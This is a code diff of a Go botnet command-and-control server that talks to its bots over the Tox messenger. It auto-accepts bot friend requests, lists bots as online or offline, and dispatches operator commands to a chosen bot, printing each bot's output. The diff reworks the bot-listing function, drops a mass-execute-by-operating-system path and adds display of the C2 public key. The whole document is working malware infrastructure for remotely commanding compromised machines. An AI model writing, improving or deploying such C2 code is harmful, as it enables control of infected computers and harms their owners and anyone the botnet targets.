@@ -23,11 +23,10 @@ var server = []interface{}{
 }
 
 var fname = "./server.data"
-var nickPrefix = "Odin"
-var statusText = "Revered immortal."
+var nickPrefix = "a"
+var statusinput = ""
 
-var fv []uint32     // Bots list
-var online []string // Online bots list
+var fv []uint32 // Bots list
 
 var commandHistory []string
 
@@ -43,59 +42,50 @@ var colorWhite = "\033[37m"
 var colorBlack = "\033[30m"
 var colorGrey = "\033[31m"
 
-// ListBots - Print all or online bots and return bots.
-func ListBots(t *tox.Tox, print string) []uint32 {
+// ListBots
+func Bots(t *tox.Tox, option string) []uint32 {
 
-	// Pull bots
 	fv := t.SelfGetFriendList()
-	// If print doesn't equal none. Check if it should print all or the online bots.
-	if print != "none" {
-		if print == "all" {
-			fmt.Println(string(colorPurple), "\n\tBots:", string(colorReset))
-			fmt.Println(string(colorBlue))
-			for _, fno := range fv {
-				fid, err := t.FriendGetPublicKey(fno)
-				if err != nil {
-					log.Println(err)
-				}
-				fmt.Println("\t\t[ ID:", fno, "]", fid)
-			}
-			fmt.Println(string(colorReset))
-		} else if print == "online" {
-			if len(online) > 0 {
-				fmt.Println(string(colorPurple), "\n\tOnline bots:", string(colorReset))
-				fmt.Println(string(colorGreen))
-				for _, online := range online {
-					values := strings.Fields(online)
-					fno, err := strconv.Atoi(values[0])
-					if err != nil {
-						log.Println(err)
-					}
-					fid, err := t.FriendGetPublicKey(uint32(fno))
-					if err != nil {
-						log.Println(err)
-					}
-					os := values[1]
-					fmt.Println("\n\t\t[ ID:", fno, "]", fid, "@", os)
-				}
-			} else {
-				fmt.Println(string(colorPurple), "\nBot(s) offline... Please wait.\n", string(colorReset))
-			}
-		}
-	}
 
-	return fv
-}
+	if option == "pull" {
+		return fv
+	} else {
 
-// Find - Finding duplicates in online bots array
-func Find(slice []string, val string) (int, bool) {
-	for i, item := range slice {
-		stringItem := fmt.Sprint(item)
-		if stringItem == val {
-			return i, true
+		for _, fno := range fv {
+			// Pull system information
+			bio, err := t.FriendGetStatusMessage(fno)
+			if err != nil {
+				panic(err)
+			}
+			// Get online status
+			status, err := t.FriendGetConnectionStatus(fno)
+			if err != nil {
+				panic(err)
+			}
+
+			if option == "all" {
+				if status == 0 {
+					fmt.Println("Offline:", fno, bio)
+				} else {
+					fmt.Println("Online:", fno, bio)
+				}
+			}
+
+			if option == "online" {
+				if status != 0 {
+					fmt.Println("Online:", fno, bio)
+				}
+			}
+
+			if option == "offline" {
+				if status == 0 {
+					fmt.Println("Offline:", fno, bio)
+				}
+			}
+
 		}
+		return nil
 	}
-	return -1, false
 }
 
 // SendMessage - message
@@ -108,7 +98,7 @@ func SendMessage(t *tox.Tox, friendNumber uint32, message string) error {
 }
 
 // showC2 - Display a banner of the C2 Tox ID
-func showC2(toxid string) {
+func showC2(toxid string, toxpub string) {
 
 	fmt.Println(string(colorYellow), `
 	 _____                 __       _   
@@ -121,6 +111,7 @@ func showC2(toxid string) {
 	fmt.Println("")
 	fmt.Println("\t\t\t\t\t", string(colorBlack), strings.Repeat("#", 80), string(colorReset))
 	fmt.Println("\t\t\t\t\t", string(colorRed), "C2:", toxid, string(colorReset))
+	fmt.Println("\t\t\t\t\t", string(colorRed), "Pub:", toxpub, string(colorReset))
 	fmt.Println("\t\t\t\t\t", string(colorBlack), strings.Repeat("#", 80), string(colorReset))
 	fmt.Println("")
 }
@@ -176,6 +167,7 @@ func main() {
 	}
 
 	toxid := t.SelfGetAddress()
+	toxpub := t.SelfGetPublicKey()
 
 	defaultName := t.SelfGetName()
 	humanName := nickPrefix + toxid[0:5]
@@ -184,9 +176,9 @@ func main() {
 	}
 	humanName = t.SelfGetName()
 
-	defaultStatusText, err := t.SelfGetStatusMessage()
-	if defaultStatusText != statusText {
-		t.SelfSetStatusMessage(statusText)
+	defaultStatusinput, err := t.SelfGetStatusMessage()
+	if defaultStatusinput != statusinput {
+		t.SelfSetStatusMessage(statusinput)
 	}
 
 	err = t.WriteSavedata(fname)
@@ -195,10 +187,10 @@ func main() {
 	}
 
 	// Show C2 address
-	showC2(toxid)
+	showC2(toxid, toxpub)
 
 	// Server load, pull all bots
-	fv = ListBots(t, "none")
+	fv = Bots(t, "pull")
 	fmt.Println(string(colorPurple))
 	fmt.Println("\tTotal bots:", len(fv))
 	fmt.Println(string(colorReset))
@@ -209,98 +201,90 @@ func main() {
 		reader := bufio.NewReader(os.Stdin)
 
 		for {
+
 			fmt.Print(string(colorGreen), "\n-> ", string(colorReset), string(colorGrey))
-			text, _ := reader.ReadString('\n')
-			text = strings.Replace(text, "\n", "", -1)
+			input, _ := reader.ReadString('\n')
+			input = strings.Replace(input, "\n", "", -1)
 
 			// Append every input to the commands array
-			commandHistory = append(commandHistory, text)
+			commandHistory = append(commandHistory, input)
 
 			// If input equals commands, print each command
-			if text == "commands" {
+			if input == "commands" {
 				fmt.Println(string(colorPurple), "\n\n\tHistory:", string(colorReset))
 				for _, command := range commandHistory {
 					fmt.Println(string(colorYellow), "\t\t", command, string(colorReset))
 				}
 			}
+
 			fmt.Println(string(colorReset))
 
 			// If the command starts with bots
-			if strings.HasPrefix(text, "bots") {
-				// Split command every space and turn into array.
-				args := strings.Fields(text)
+			if strings.HasPrefix(input, "bots") {
+				// Split command
+				args := strings.Fields(input)
 				// If there is more or 4 arguments in the command.
 				if len(args) >= 3 {
 					// If the 2nd argument in the command is list.
 					if args[1] == "list" {
-						// If the 3rd argument is all. Print all bots.
-						if args[2] == "all" {
-							fv = ListBots(t, "all")
-							// If the 3rd argument is amount. Print amount of bots.
-						} else if args[2] == "amount" {
-							fv = ListBots(t, "none")
+						if args[2] == "amount" {
+							// Server load, pull all bots
+							fv = Bots(t, "pull")
 							fmt.Println(string(colorPurple))
 							fmt.Println("\tTotal bots:", len(fv))
 							fmt.Println(string(colorReset))
-							// If the 3rd argument is online. Print online bots.
-						} else if args[2] == "online" {
-							fv = ListBots(t, "online")
 						}
+
+						// List online
+						if args[2] == "online" {
+							Bots(t, "online")
+						}
+						// List offline
+						if args[2] == "offline" {
+							Bots(t, "offline")
+						}
+
 						// If the 2nd argument in the command is interact.
 					} else if args[1] == "interact" {
-						// If the ID isn't all. Then execute for that specific ID.
-						if args[2] != "*" {
-							// Convert ID to int
-							botid, err := strconv.Atoi(args[2])
+						// Grab all bots, when getting ready to interact.
+						fv = Bots(t, "pull")
+
+						// Convert ID to int
+						botid, err := strconv.Atoi(args[2])
+						if err != nil {
+							log.Println(err)
+						}
+
+						// If the bot ID is in the the bots list.
+						if botid < len(fv) {
+							// Send the command to the bot.
+							commands := args[3:]
+							command := strings.Join(commands, " ")
+							err = SendMessage(t, fv[botid], command)
+
 							if err != nil {
-								log.Println(err)
+								fmt.Println("Bot offline...")
 							}
-							// If the bot ID is in the the bots list.
-							if botid < len(fv) {
-								// Send the command to the bot.
-								commands := args[3:len(args)]
-								command := strings.Join(commands, " ")
-								err = SendMessage(t, fv[botid], command)
-								if err != nil {
-									fmt.Println("Bot offline...")
-								}
-							} else {
-								fmt.Println("Bot doesn't exist...")
-							}
+
 						} else {
-							// Mass execute command
-							for _, online := range online {
-								values := strings.Fields(online)
-								fno, err := strconv.Atoi(values[0])
-								if err != nil {
-									log.Println(err)
-								}
-								if err != nil {
-									log.Println(err)
-								}
-								os := values[1]
-								commands := args[4:len(args)]
-								command := strings.Join(commands, " ")
-								if string(args[3]) == os {
-									SendMessage(t, fv[fno], command)
-								}
-							}
+							fmt.Println("Bot doesn't exist...")
 						}
 					}
+
 				} else {
-					// If there was not enough arguments, then show the examples.
+					// Not enough arguments: show examples
 					helpCommands("bots")
 				}
-				// If the command is help
-			} else if text == "help" {
-				// Show all help commands
+
+			} else if input == "help" {
+				// Show help menu
 				helpCommands("")
-			} else if text == "clear" {
+			} else if input == "clear" {
 				// Clear console
 				fmt.Print("\033[H\033[2J")
-				showC2(toxid)
-			} else if text == "exit" {
-				// Exit C2
+				showC2(toxid, toxpub)
+			} else if input == "exit" {
+				// Exit
 				fmt.Println("\tGoodbye!")
 				os.Exit(1)
 			}
@@ -309,9 +293,9 @@ func main() {
 
 	// Auto accept
 	t.CallbackFriendRequest(func(t *tox.Tox, friendId string, message string, userData interface{}) {
+
 		// When a bot adds the C2. Add them back with no message.
 		num, err := t.FriendAddNorequest(friendId)
-		fv = ListBots(t, "none")
 
 		if err != nil {
 			log.Println("on friend request:", num, err)
@@ -323,27 +307,8 @@ func main() {
 
 	// On message
 	t.CallbackFriendMessage(func(t *tox.Tox, friendNumber uint32, message string, userData interface{}) {
-		// If incoming message starts with update
-		if strings.HasPrefix(message, "update") {
-			// Split the incoming update message
-			args := strings.Fields(message)
-			// Return friendNumber as string
-			str := fmt.Sprint(friendNumber)
-			// Make a string with friendNumber and operating system
-			foundBot := str + " " + args[1]
-			// Look for that string in the online array
-			_, found := Find(online, foundBot)
-			// If it cannot be found
-			if !found {
-				// Append the bot to the online array
-				online = append(online, foundBot)
-			}
-
-		} else {
-			// If the response wasn't update. Print the response.
-			fmt.Print("Output:", friendNumber, "\n\n", message, string(colorGreen), "\n\n-> ", string(colorRed))
-		}
-
+		fmt.Print(string(colorYellow), "Output:", friendNumber, string(colorCyan), "\n\t\t", message)
+		fmt.Print(string(colorGreen), "-> ", string(colorRed))
 	}, nil)
 
 	// toxcore loops
